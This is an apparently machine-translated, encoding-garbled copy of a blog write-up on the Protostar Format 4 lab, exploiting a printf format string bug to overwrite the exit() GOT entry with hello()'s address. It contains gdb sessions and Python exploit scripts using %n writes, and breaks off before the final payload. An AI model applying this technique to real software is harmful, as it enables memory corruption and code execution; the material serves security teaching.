<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Format 4</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]æ¼æ´åˆ©ç”¨ç»ƒä¹ | Protostar |æ ¼å¼4</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-4-e2907b4716d1?source=collection_archive---------2-----------------------#2020-06-08">https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-4-e2907b4716d1?source=collection_archive---------2-----------------------#2020-06-08</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/ceaf1b32cd6771632e8837d376cfaa36.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7r32PQ2t6XWklu5L.png"/></div></div></figure><h1 id="868a" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">æ ¼å¼4(æ ¼å¼å­—ç¬¦ä¸²æ¼æ´:GOT)</h1><p id="3480" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">è¯¥æŒ‘æˆ˜çš„ç›®æ ‡æ˜¯é€šè¿‡åˆ©ç”¨å…¨å±€åç§»è¡¨(â€œGOTâ€)è€Œä¸æ˜¯æˆ‘ä»¬åœ¨ä¹‹å‰çš„æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æŒ‘æˆ˜ä¸­ä½¿ç”¨çš„è¿”å›æŒ‡é’ˆï¼Œé‡å®šå‘æˆ‘ä»¬çš„æ‰§è¡Œæµä»¥æ‰“å°è·èƒœçš„è¯­å¥ã€‚è®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹:)</p><ul class=""><li id="f0ff" class="lx ly it lb b lc lz lg ma lk mb lo mc ls md lw me mf mg mh bi translated">é“¾æ¥:<a class="ae mi" href="https://exploit-exercises.lains.space/protostar/format4/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/format4/</a></li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mj"><img src="../Images/b03ad914c88216cc76f7d0c5e6e31602.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VaziLtnu_7ncNFi_9UbbPg.png"/></div></div></figure><h2 id="eef6" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æ³¨æ„äº‹é¡¹</h2><ul class=""><li id="1354" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">char buffer[512]</strong></code>:è®¾ç½®ç¼“å†²åŒºå¤§å°ä¸º512ã€‚</li><li id="a803" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">fgets(buffer, sizeof(buffer), stdin)</strong></code>:è·å–ç”¨æˆ·æä¾›çš„è¾“å…¥ã€‚å¹¶ä¸”å®ƒå°†ç¼“å†²åŒºå¤§å°é™åˆ¶ä¸º512ã€‚æˆ‘ä»¬å¯ä»¥æœ€å¤§è¾“å…¥511ä¸ªå­—èŠ‚ï¼Œå› ä¸ºCæ€»æ˜¯åœ¨å­—ç¬¦ä¸²æœ«å°¾æ·»åŠ <code class="fe nd ne nf ng b">0x00</code>ä½œä¸ºç»ˆæ­¢ç¬¦ã€‚</li><li id="feda" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">printf(buffer);</strong></code>:è¿™æ˜¯è¿™æ®µä»£ç ä¸­æ˜“å—æ”»å‡»çš„å‡½æ•°ã€‚<code class="fe nd ne nf ng b">printf()</code>å°†<em class="nm">è€Œé</em>æ£€æŸ¥æ‰€æä¾›çš„è¾“å…¥æ˜¯å¦æ˜¯é¢„æœŸçš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«ç¼–ç ä¸ºæ¥å—ä»»ä½•å­—ç¬¦ä¸²å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬èƒ½åšçš„å°±æ˜¯ç®€å•åœ°éªŒè¯æˆ‘ä»¬æ˜¯å¦å¯ä»¥æ³„æ¼å†…å­˜åœ°å€ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥å°†ä»»æ„ä»£ç å†™åˆ°å †æ ˆä¸Š(<strong class="lb iu">ã€è¯»å–ã€‘</strong> <code class="fe nd ne nf ng b">%p</code>æˆ–è€…<code class="fe nd ne nf ng b">%x</code> â†’ <strong class="lb iu">ã€å†™å…¥ã€‘</strong> <code class="fe nd ne nf ng b">%n</code>)ã€‚</li><li id="4e7b" class="lx ly it lb b lc nh lg ni lk nj lo nk ls nl lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">exit(1);</strong></code>:<code class="fe nd ne nf ng b">exit(1)</code>æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒç®€å•åœ°é€€å‡ºç¨‹åºã€‚ä¸ä¹‹å‰çš„ç»ƒä¹ ä¸åŒï¼Œæˆ‘ä»¬åœ¨<code class="fe nd ne nf ng b">printf()</code>ä¹‹åæ²¡æœ‰ä»»ä½•è¿”å›åœ°å€ï¼›ç›¸åï¼Œæˆ‘ä»¬æœ‰è¿™ä¸ª<code class="fe nd ne nf ng b">exit(1)</code>ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åšçš„æ˜¯ï¼Œç”±äº<code class="fe nd ne nf ng b">exit(1)</code>æ˜¯å…¨å±€åç§»è¡¨(â€œGOTâ€)çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code class="fe nd ne nf ng b">hello()</code>çš„åœ°å€è¦†ç›–å®ƒçš„<code class="fe nd ne nf ng b">exit(1)</code>å‡½æ•°çš„å…¥å£ç‚¹ï¼Œä»¥æ‰“å°å‡ºè·èƒœçš„è¯­å¥ã€‚</li></ul><h2 id="ab63" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æœ‰ä»€ä¹ˆï¼Ÿ</h2><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nn"><img src="../Images/ed9da8f06f7568698314e29c9841d9b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Et-fcoEbEEzd-K-aNwtIOQ.png"/></div></div><figcaption class="no np gj gh gi nq nr bd b be z dk translated">æ¥æº:<a class="ae mi" href="https://ctf101.org/binary-exploitation/what-is-the-got/" rel="noopener ugc nofollow" target="_blank">https://ctf101.org/binary-exploitation/what-is-the-got/</a></figcaption></figure><p id="420e" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">ç®€å•åœ°è¯´ï¼ŒGOTå¸®åŠ©åœ¨åŠ¨æ€é“¾æ¥çš„ELFäºŒè¿›åˆ¶æ–‡ä»¶ä¸­åŠ è½½å…±äº«åº“å‡½æ•°(ä¾‹å¦‚<code class="fe nd ne nf ng b">exit()</code>)ã€‚åŸºæœ¬ä¸Šï¼Œä¸€ä¸ªäººå¯ä»¥åˆ›å»ºä»–ä»¬çš„ç¨‹åºï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–å†™åƒ<code class="fe nd ne nf ng b">exit()</code>è¿™æ ·çš„æµè¡Œå‡½æ•°ï¼›ç›¸åï¼Œå®ƒä»¬å¯ä»¥æ·»åŠ æŒ‡é’ˆæ¥è°ƒç”¨è¿™äº›å‡½æ•°ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ã€‚ä¸‹é¢æ˜¯ASMæ–‡ä»¶ç¤ºä¾‹:</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nv"><img src="../Images/bd0405092aaac927ebc7d3340ab4ad83.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4Msz3kGs2wkQy_d54UHn0g.png"/></div></div><figcaption class="no np gj gh gi nq nr bd b be z dk translated">æ¥æº:<a class="ae mi" href="https://github.com/bigb0sss/b0ssTheASM/blob/master/0x06_libc/libc_01.nasm" rel="noopener ugc nofollow" target="_blank">https://github . com/big B0 SSS/b 0 ssheasm/blob/master/0x 06 _ libc/libc _ 01 . nasm</a></figcaption></figure></div><div class="ab cl nw nx hx ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="im in io ip iq"><h1 id="bf0b" class="kb kc it bd kd ke od kg kh ki oe kk kl km of ko kp kq og ks kt ku oh kw kx ky bi translated">æ‹†è§£(GDB)</h1><p id="126f" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">è®©æˆ‘ä»¬åæ±‡ç¼–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œçœ‹çœ‹åœ¨ASMçº§åˆ«åšäº†ä»€ä¹ˆã€‚</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="5d34" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ gdb -q /opt/protostar/bin/format4</strong><br/>Reading symbols from /opt/protostar/bin/format4...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel <br/>(gdb) disassemble vuln</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oq"><img src="../Images/a5199cffe85bd327d50d7223666bf06f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EjlJp-j2XuqH5V3y_jBTtA.png"/></div></div></figure><p id="af4c" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">ä»æºä»£ç çš„è§’åº¦æ¥çœ‹ï¼Œç¨‹åºæœ¬èº«éå¸¸ç®€å•ã€‚æˆ‘ä»¬ç°åœ¨åªéœ€è¦è®°ä¸‹<code class="fe nd ne nf ng b">exit()</code>å‡½æ•°(<code class="fe nd ne nf ng b">0x8049724</code>)çš„å…¥å£åœ°å€ã€‚</p></div><div class="ab cl nw nx hx ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="im in io ip iq"><h1 id="fdd8" class="kb kc it bd kd ke od kg kh ki oe kk kl km of ko kp kq og ks kt ku oh kw kx ky bi translated">å‰¥å‰Š</h1><h2 id="0de1" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">åˆæ­¥ä¾¦å¯Ÿ</h2><p id="7b5d" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬æä¾›ä¸€äº›éšæœºçš„å­—ç¬¦ä¸²:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="c89a" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python -c 'print "AAAA"' | /opt/protostar/bin/format4</strong><br/>AAAA</span></pre><p id="925b" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">æ‰“å°å‡ºæˆ‘ä»¬è¾“å…¥çš„ä»»ä½•å­—ç¬¦ä¸²ã€‚ä½†æ˜¯å¦‚æœæä¾›ä¸€äº›æ ¼å¼å­—ç¬¦ä¸²å‚æ•°(<code class="fe nd ne nf ng b">%08x</code>ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€äº›æœ‰è¶£çš„è¾“å‡º:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="bb8d" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 2' | /opt/protostar/bin/format4</strong><br/>AAAA|00000200|b7fd8420</span><span id="3bd4" class="mo kc it ng b gy or on l oo op"><strong class="ng iu"><em class="nm">### Format String Explanation<br/>"%08x"</em></strong><em class="nm"> = "%x" is a Format String parameter of the hexdecimal <br/>         representation. <br/>         The number "08" is the minimum value for "width field."<br/>         This will pad the output of the "%x" specified to 8<br/>         characters, which is equal to 4 bytes long.</em></span></pre><h2 id="c788" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">å¯»æ‰¾åç§»</h2><p id="c34e" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°åœ¨å †æ ˆä¸Šå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æä¾›çš„è¾“å…¥çš„åç§»é‡ã€‚å¦‚æœæˆ‘ä»¬å°è¯•å¢åŠ å‡ ä¸ª<code class="fe nd ne nf ng b">%x</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åç§»é‡ä¸º4ã€‚</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="4723" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 3' | /opt/protostar/bin/format4</strong><br/>AAAA|00000200|b7fd8420|bffff5f4</span><span id="3212" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">$ python -c 'print "AAAA" + "|%08x" * 4' | /opt/protostar/bin/format4</strong><br/>AAAA|00000200|b7fd8420|bffff5f4|<strong class="ng iu">41414141    &lt;-- chr(0x41) = "A"</strong></span></pre><h2 id="1cd2" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">ç¡®è®¤å¯¹GOTæ¡ç›®çš„å†™å…¥</h2><p id="50bd" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">å¦‚æœæ‚¨æœ‰ç–‘é—®ï¼Œè®©æˆ‘ä»¬ç¡®è®¤ä¸€ä¸‹æˆ‘ä»¬æ˜¯å¦å¯ä»¥è¦†ç›–<code class="fe nd ne nf ng b">exit(1)</code> GOT ( <code class="fe nd ne nf ng b">0x8049724</code>ï¼Œ<em class="nm">æˆ‘ä»¬ä»ä¸Šé¢çš„â€œæ‹†å¸(GDB)â€éƒ¨åˆ†è·å¾—äº†è¿™ä¸ªåœ°å€ğŸ™‚</em>åŒæ­¤ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç®€å•çš„æ¼æ´åˆ©ç”¨è„šæœ¬:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="30bd" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">[exploit.py]</strong></span><span id="a31b" class="mo kc it ng b gy or on l oo op">#!/usr/bin/python</span><span id="0ce4" class="mo kc it ng b gy or on l oo op">import struct</span><span id="653b" class="mo kc it ng b gy or on l oo op">exit_plt = 0x8049724                      <strong class="ng iu"># Entry of exit(1) GOT</strong></span><span id="159f" class="mo kc it ng b gy or on l oo op">exploit = ""<br/>exploit+= struct.pack("I",exit_plt)       <br/>exploit+= "%4$08n"                        <strong class="ng iu"># Write a number of <br/>                                            characters in the 4th <br/>                                            location (= offset)</strong></span><span id="5c14" class="mo kc it ng b gy or on l oo op">print exploit</span></pre><p id="18cc" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">å°†è¿™ä¸ªæ–‡ä»¶ä½œä¸ºè¾“å‡ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°†å®ƒè¾“å…¥åˆ°gdbä¸­:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="5e57" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python exploit.py &gt; exploit</strong></span></pre><p id="b7ce" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">è¿è¡Œgdbï¼Œåœ¨<code class="fe nd ne nf ng b">printf()</code>å’Œ<code class="fe nd ne nf ng b">exit()</code>ç³»ç»Ÿè°ƒç”¨ä¸Šè®¾ç½®æ–­ç‚¹ï¼Œå¹¶æä¾›æˆ‘ä»¬çš„<code class="fe nd ne nf ng b">exploit</code>è¾“å‡º:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="db88" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ gdb -q /opt/protostar/bin/format4 </strong><br/>  Reading symbols from /opt/protostar/bin/format4...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel </strong><br/><strong class="ng iu">(gdb) disassemble vuln</strong><br/>Dump of assembler code for function vuln:<br/>  0x080484d2 &lt;vuln+0&gt;: push   ebp<br/>  0x080484d3 &lt;vuln+1&gt;: mov    ebp,esp<br/>  0x080484d5 &lt;vuln+3&gt;: sub    esp,0x218<br/>  0x080484db &lt;vuln+9&gt;: mov    eax,ds:0x8049730<br/>  0x080484e0 &lt;vuln+14&gt;: mov    DWORD PTR [esp+0x8],eax<br/>  0x080484e4 &lt;vuln+18&gt;: mov    DWORD PTR [esp+0x4],0x200<br/>  0x080484ec &lt;vuln+26&gt;: lea    eax,[ebp-0x208]<br/>  0x080484f2 &lt;vuln+32&gt;: mov    DWORD PTR [esp],eax<br/>  0x080484f5 &lt;vuln+35&gt;: call   0x804839c &lt;fgets@plt&gt;<br/>  0x080484fa &lt;vuln+40&gt;: lea    eax,[ebp-0x208]<br/>  0x08048500 &lt;vuln+46&gt;: mov    DWORD PTR [esp],eax<br/>  <strong class="ng iu">0x08048503 &lt;vuln+49&gt;: call   0x80483cc &lt;printf@plt&gt;   &lt;-- Break 1</strong><br/>  0x08048508 &lt;vuln+54&gt;: mov    DWORD PTR [esp],0x1<br/>  <strong class="ng iu">0x0804850f &lt;vuln+61&gt;: call   0x80483ec &lt;exit@plt&gt;     &lt;-- Break 2</strong><br/>  End of assembler dump.<br/><strong class="ng iu">(gdb) break * 0x08048503</strong><br/>  Breakpoint 1 at 0x8048503: file format4/format4.c, line 20.<br/><strong class="ng iu">(gdb) break * 0x0804850f</strong><br/>  Breakpoint 2 at 0x804850f: file format4/format4.c, line 22.<br/><strong class="ng iu">(gdb) run &lt; /home/user/format4/exploit </strong><br/>  Starting program: /opt/protostar/bin/format4 &lt; /home/user/format4. <br/>  /exploit</span><span id="4a5e" class="mo kc it ng b gy or on l oo op">  Breakpoint 1, 0x08048503 in vuln () at format4/format4.c:20<br/>  20 format4/format4.c: No such file or directory.<br/><strong class="ng iu">(gdb) disassemble 0x80483ec                   &lt;-- Disassemble exit()</strong><br/>  Dump of assembler code for function exit@plt:<br/>  0x080483ec &lt;exit@plt+0&gt;: jmp    DWORD PTR ds:<strong class="ng iu">0x8049724</strong><br/>  0x080483f2 &lt;exit@plt+6&gt;: push   0x30<br/>  0x080483f7 &lt;exit@plt+11&gt;: jmp    0x804837c<br/>  End of assembler dump.<br/><strong class="ng iu">(gdb) x 0x8049724                  &lt;-- Examine the current GOT entry</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x080483f2</strong><br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.<br/>  $ï¿½</span><span id="7454" class="mo kc it ng b gy or on l oo op">  Breakpoint 2, 0x0804850f in vuln () at format4/format4.c:22<br/>  22 in format4/format4.c<br/><strong class="ng iu">(gdb) x 0x8049724                  &lt;-- Examine the current GOT entry</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x00000004</strong></span></pre><p id="04d6" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">å¤ªå¥½äº†ã€‚å¦‚æ‚¨æ‰€è§ï¼Œä»<code class="fe nd ne nf ng b">0x080483f2</code>åˆ°<code class="fe nd ne nf ng b">0x00000004</code>çš„æœ‰æ•ˆè½½è·å·²ç»è¦†ç›–äº†GOTåœ°å€çš„æ¡ç›®ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°<code class="fe nd ne nf ng b">hello()</code>å‡½æ•°çš„åœ°å€ï¼Œå¹¶æ›´æ–°æˆ‘ä»¬çš„æ¼æ´ï¼Œç”¨å®ƒæ¥æ­£ç¡®åœ°è¦†ç›–getå…¥å£ç‚¹ã€‚</p><h2 id="19a8" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æ­£åœ¨æŸ¥æ‰¾â€œhello()â€çš„åœ°å€</h2><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="86d9" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ objdump -t /opt/protostar/bin/format4 |grep hello</strong><br/><strong class="ng iu">080484b4</strong> g     F .text 0000001e              hello</span></pre><p id="6dbf" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">æ‰¾åˆ°çš„<code class="fe nd ne nf ng b">hello()</code>åŠŸèƒ½çš„åœ°å€æ˜¯<code class="fe nd ne nf ng b">0x080484b4</code>ã€‚</p></div><div class="ab cl nw nx hx ny" role="separator"><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob oc"/><span class="nz bw bk oa ob"/></div><div class="im in io ip iq"><h2 id="8c42" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">æœ€ç»ˆåˆ©ç”¨(2å­—èŠ‚çŸ­å†™)</h2><p id="affd" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">ç”±æ­¤çœ‹æ¥ï¼Œè¿™ä¸ªæ¼æ´åº”è¯¥ä¸æˆ‘ä»¬åœ¨<code class="fe nd ne nf ng b">Format3</code>ç»ƒä¹ <a class="ae mi" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83" rel="noopener">å’Œ</a>ä¸­æ‰€åšçš„éå¸¸ç›¸ä¼¼ã€‚ç”±äºç”¨å®½åº¦å­—æ®µæ§åˆ¶<code class="fe nd ne nf ng b">%n</code>å¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½•æŠ€æœ¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å°†ç”¨2å­—èŠ‚çš„çŸ­å†™æ–¹æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p id="ffe0" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">ä¸ºäº†è¿›ä¸€æ­¥æ¾„æ¸…ï¼Œè®©æˆ‘å¿«é€Ÿè§£é‡Šä¸€ä¸‹è¿™å°†å¦‚ä½•è¿›è¡Œ:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="ae22" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">1) Our overwriting point: </strong><br/>  0x08049724 (Entry of the exit() GOT)</span><span id="5eda" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">2) Desired value that we want to overwrite with:</strong><br/>  <!-- -->0x080484b4 (hello())</span><span id="e532" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">3) 2-byte Short Write points:<br/>(gdb) x 0x8049724</strong><br/>0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x080483f2</strong><br/>                                          â¬‡<br/>                    0x08           <strong class="ng iu">04</strong>             83             <strong class="ng iu">f2</strong><br/>              ------------------------------------------------------<br/>              0x8049727      <strong class="ng iu">0x8049726      0x8049725      0x8049724</strong></span></pre><p id="256b" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">æ ¹æ®ä¸Šé¢çš„è¡¨ç¤ºï¼Œæˆ‘ä»¬å°†åˆ©ç”¨åœ°å€:<code class="fe nd ne nf ng b"><strong class="lb iu">0x8049724</strong></code>å’Œ<code class="fe nd ne nf ng b"><strong class="lb iu">0x8049726</strong></code>ã€‚æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚</p><p id="d203" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">è®©æˆ‘ä»¬éªŒè¯ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥åœ¨è¿™äº›<code class="fe nd ne nf ng b"><strong class="lb iu">0x8049724</strong></code>å’Œ<code class="fe nd ne nf ng b"><strong class="lb iu">0x8049726</strong></code>åœ°å€ä¸Šå†™å…¥ä»»æ„å€¼:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="a995" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">[exploit.py]</strong></span><span id="dba3" class="mo kc it ng b gy or on l oo op">#!/usr/bin/python</span><span id="635d" class="mo kc it ng b gy or on l oo op">import struct</span><span id="c249" class="mo kc it ng b gy or on l oo op">hello = 0x080484b4<br/>exit_plt = 0x8049724                      <br/>exit_plt2 = 0x8049726</span><span id="f7c2" class="mo kc it ng b gy or on l oo op">exploit = ""<br/>exploit+= struct.pack("I",exit_plt)<br/>exploit+= struct.pack("I",exit_plt2)<br/>exploit+= "%4$08n"<br/>exploit+= "%5$08n"</span><span id="1ed9" class="mo kc it ng b gy or on l oo op">print exploit</span></pre><p id="fde3" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">ä¸€æ—¦æˆ‘ä»¬å°†ä¸Šè¿°æ¼æ´ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œè¿è¡Œgdbæ¥æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦å¯ä»¥è¦†ç›–æ¯ä¸ªåœ°å€ä½ç½®:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="6d79" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">### Confirming 2-byte Overwrite on GOT Entry</strong></span><span id="eb9f" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) run &lt; /home/user/format4/exploit </strong><br/>  Starting program: /opt/protostar/bin/format4 &lt; /home/user/format4 <br/>  /exploit</span><span id="09c7" class="mo kc it ng b gy or on l oo op">  Breakpoint 1, 0x08048503 in vuln () at format4/format4.c:20<br/>  20 in format4/format4.c<br/><strong class="ng iu">(gdb) x 0x8049724</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: 0x080483f2<br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.<br/>  $&amp;ï¿½</span><span id="bf1b" class="mo kc it ng b gy or on l oo op">  Breakpoint 2, 0x0804850f in vuln () at format4/format4.c:22<br/>  22 in format4/format4.c<br/><strong class="ng iu">(gdb) x 0x8049724</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x00080008</strong></span></pre><p id="673a" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">å¾ˆå¥½ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„å°è¯•åœ¨æ¯ä¸ªåœ°å€ä½ç½®ä¸Šéƒ½å†™äº†<code class="fe nd ne nf ng b">0x0008</code>å€¼ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦è®¡ç®—å®½åº¦å­—æ®µï¼Œä»¥ä¾¿è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„å€¼ã€‚(<em class="nm"> * </em> <a class="ae mi" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener"> <em class="nm">æŸ¥çœ‹</em> </a> <code class="fe nd ne nf ng b"><a class="ae mi" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener"><em class="nm">Format2</em></a></code> <a class="ae mi" href="https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener"> <em class="nm">ç»ƒä¹ ï¼Œäº†è§£å…³äºå®½åº¦å­—æ®µè®¡ç®—çš„æ›´å¤šè¯¦ç»†è¯´æ˜</em> </a>)</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="d307" class="mo kc it ng b gy om on l oo 